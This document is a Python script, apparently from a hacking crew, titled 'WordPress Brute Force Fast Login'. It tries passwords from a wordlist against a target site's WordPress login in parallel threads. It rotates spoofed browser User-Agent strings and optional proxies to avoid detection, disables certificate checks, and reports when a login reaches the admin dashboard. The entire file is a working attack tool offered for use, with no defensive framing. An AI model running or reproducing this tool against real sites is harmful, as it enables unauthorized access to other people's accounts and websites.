#!/usr/bin/env python3
# -*- coding: utf-8 -*-
_E='[{}Trying{}] {}::{}'
_D='(http|https)://[\\w-]+(.[\\w-]+)+\\S*'
_C=False
_B=None
_A=True
import re,os,__main__ as main
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor,as_completed
import random
try:import requests,urllib3
except ImportError:print('[WARNING] the "requests" module has not been installed. please type "pip3 install requests" to install it\n');os._exit(0)
try:from colorama import Fore as F
except ImportError:print('[WARNING] the "colorama" module has not been installed. please type "pip3 install colorama" to install it\n');os._exit(0)
_banner='\x1b[2J\x1b[H\x1b[J\nWordPress Brute Force Fast Login\nAuthor : RandsX@22XploiterCrew\nE-Mail : dev@22xploitercrew.my.id\n'
UserAgent=['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4','Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9','Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)','Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0','Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0','Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36']
print(_banner)
def login(url,username,password,proxy):
	D=proxy;B=password;global UserAgent;E={'log':username,'pwd':B};G={'User-agent':random.choice(UserAgent)};requests.packages.urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning);C=requests.session()
	try:
		if D is not _B:A=D.split(':');A={A[0]:A[1]};H=C.post(url+'/',data=E,allow_redirects=_A,timeout=10,proxies=A,verify=_C,headers=G)
		else:H=C.post(url+'/',data=E,allow_redirects=_A,timeout=10,verify=_C,headers=G)
		I=re.search('/wp-admin',H.url);C.cookies.clear()
		if I is not _B:completed(B,_A)
		else:return B
	except requests.exceptions.ReadTimeout:print('[{}ERROR{}] Request timeout'.format(F.RED,F.WHITE));os._exit(0)
	except requests.exceptions.ConnectionError:print('[{}ERROR{}] Connection Error'.format(F.RED,F.WHITE));os._exit(0)
	except urllib3.exceptions.ProxySchemeUnknown as J:print('[{}ERROR{}] {}'.format(F.RED,F.WHITE,J));os._exit(0)
	except:print('[{}ERROR{}] Something error, please check the target'.format(F.RED,F.WHITE));os._exit(0)
def openfile(filename):
	B=filename;C=[]
	try:
		A=open(B,'r');A=A.readlines()
		for D in A:C.append(D.replace('\n',''))
		return C
	except FileNotFoundError:print('[{}ERROR{}] File "{}" not exists'.format(F.RED,F.WHITE,B));os._exit(0)
def completed(password='',found=_C):
	A='=';print(_banner);print('{}Target completed successfully{}'.format(F.YELLOW,F.WHITE))
	if found is _A:print('{}Successfully entered into the target dashboard{}'.format(F.GREEN,F.WHITE))
	else:print('{}Failed to enter the target dashboard{}'.format(F.BLUE,F.WHITE))
	print(A*(len(url)+12));print('Target   :',url);print('Username :',usr);print('Password :',password);print(A*(len(url)+12));os._exit(0)
parser=ArgumentParser(prog=os.path.basename(main.__file__),usage='python3 %(prog)s url username [-p|-P] [-x PROXY] [-v VERBOSE]',epilog='Please check your target first so that the login process runs smoothly')
parser.add_argument('-V','--version',action='version',version='%(prog)s version 1.2')
parser.add_argument('-v','--verbose',action='store_true',help='verbose mode/show username and password combination for each attempt')
parser.add_argument('url',type=str,help='url the target')
parser.add_argument('username',type=str,help='username target')
pwnd=parser.add_mutually_exclusive_group()
pwnd.add_argument('-p','--password',metavar='',help='use one word password')
pwnd.add_argument('-P','--passlist',metavar='',help='use a few words password')
parser.add_argument('-x','--proxy',metavar='',help='use a socks/proxy for request (ex: 127.0.0.1:8080)')
args=parser.parse_args()
checkUrl=re.search(_D,args.url)
if checkUrl is _B:print('[{}ERROR{}] You must insert the procotol'.format(F.RED,F.WHITE));os._exit(0)
url=args.url
usr=args.username
if args.proxy:
	check=re.search(_D,args.proxy)
	if check is _B:print('[{}ERROR{}] You must insert the procotol for proxy'.format(F.RED,F.WHITE));os._exit(0)
	else:proxy=args.proxy
try:
	response=requests.get(url+'/')
	if response.status_code==429:print('[{}ERROR{}] To many requests'.format(F.RED,F.WHITE));os._exit(0)
	if args.password:
		if args.verbose:print(_E,format(F.YELLOW,F.WHITE,usr,args.password))
		else:print('Please Wait . . .')
		login(url,usr,args.password,proxy)
	elif args.passlist:
		processed=[];file=openfile(args.passlist)
		with ThreadPoolExecutor()as executor:
			for pwd in file:processed.append(executor.submit(login,url,usr,pwd,proxy))
			for process in as_completed(processed):
				process=process.result()
				if args.verbose:print(_E.format(F.YELLOW,F.WHITE,usr,process))
				else:print('\rPlease Wait . . .',flush=_A,end='')
	completed()
except requests.exceptions.ConnectionError:print('[{}ERROR{}] No address associated with hostname'.format(F.RED,F.WHITE))
except KeyboardInterrupt:print('[{}WARNING{}] Session cancelled'.format(F.YELLOW,F.WHITE))
except Exception as e:print('[{}ERROR{}] Something error\n{}'.format(F.RED,F.WHITE,e))
